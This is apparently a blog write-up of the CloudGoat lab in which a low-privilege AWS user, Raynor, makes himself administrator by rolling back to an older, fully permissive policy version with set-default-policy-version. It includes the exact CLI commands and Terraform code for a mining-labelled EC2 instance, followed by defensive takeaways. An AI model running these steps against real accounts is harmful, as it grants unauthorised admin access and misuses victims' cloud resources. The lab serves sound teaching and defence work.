---
layout: post
title: "IAM Privilege Escalation by Policy Rollback"
date: 2022-06-13 20:01:41 +0000
categories: Cybersecurity
tags: [aws,cloud]
author: admin
---

What if a low-privilege AWS user could silently grant themselves administrator access without creating new credentials or modifying any resources directly? This is exactly what the **IAM Privilege Escalation by Policy Rollback** scenario demonstrates. In this CloudGoat lab, we start as an IAM user named Raynor with minimal permissions and exploit a subtle but dangerous IAM misconfiguration to achieve full admin rights.

## Step 1: Analyze Raynor's Privileges

First, make an STS call to confirm the identity of the user:

```bash
aws sts get-caller-identity --profile raynor
```

With the username confirmed, list the policies attached to Raynor's account:

```bash
aws iam list-attached-user-policies --user-name raynor --profile raynor
```

We get back a single managed policy. Now list all versions of that policy:

```bash
aws iam list-policy-versions --policy-arn <policy-arn> --profile raynor
```

There are **five versions** — only one is currently the default. When we inspect the active version, we find a critical permission:

```bash
aws iam get-policy-version --policy-arn <policy-arn> --version-id v1 --profile raynor
```

Raynor has `iam:SetDefaultPolicyVersion` — meaning he can activate **any prior version** of his own policy.

## Step 2: Find the Version with Admin Rights

Check the non-default versions to see if any grant elevated permissions:

```bash
aws iam get-policy-version --policy-arn <policy-arn> --version-id v3 --profile raynor
```

Version 3 grants **full administrator access (`*:*`)**. That's our target.

## Step 3: Escalate to Admin

Set version 3 as the default policy version:

```bash
aws iam set-default-policy-version \
  --policy-arn <policy-arn> \
  --version-id v3 \
  --profile raynor
```

Confirm the change took effect:

```bash
aws iam get-policy --policy-arn <policy-arn> --profile raynor
```

Raynor now has full administrator access.

## Step 4: Make Havoc

To play the role of an attacker who just elevated their privileges, we spin up an EC2 instance for crypto mining using Terraform:

```hcl
resource "aws_instance" "crypto_miner" {
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t2.micro"

  tags = {
    Name = "miner"
  }
}
```

```bash
terraform init
terraform apply
```

Verify Raynor's actions appear in CloudTrail:

```bash
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=Username,AttributeValue=raynor \
  --profile raynor
```

## Conclusion

This lab highlights how `iam:SetDefaultPolicyVersion` is a **high-risk permission** that should almost never be granted to a regular user. An attacker who inherits this permission can silently roll back to an older, more permissive version of their own policy — bypassing intent without touching any other IAM resources.

**Key takeaways:**
- Audit **all versions** of your IAM policies, not just the active one — old versions can be a backdoor
- Treat `iam:SetDefaultPolicyVersion` as a privileged action and restrict it accordingly
- Practice least privilege: give users exactly what they need for their role, and nothing more

That's the end of the lab for today. Next time I'll do something a bit different, so stay tuned!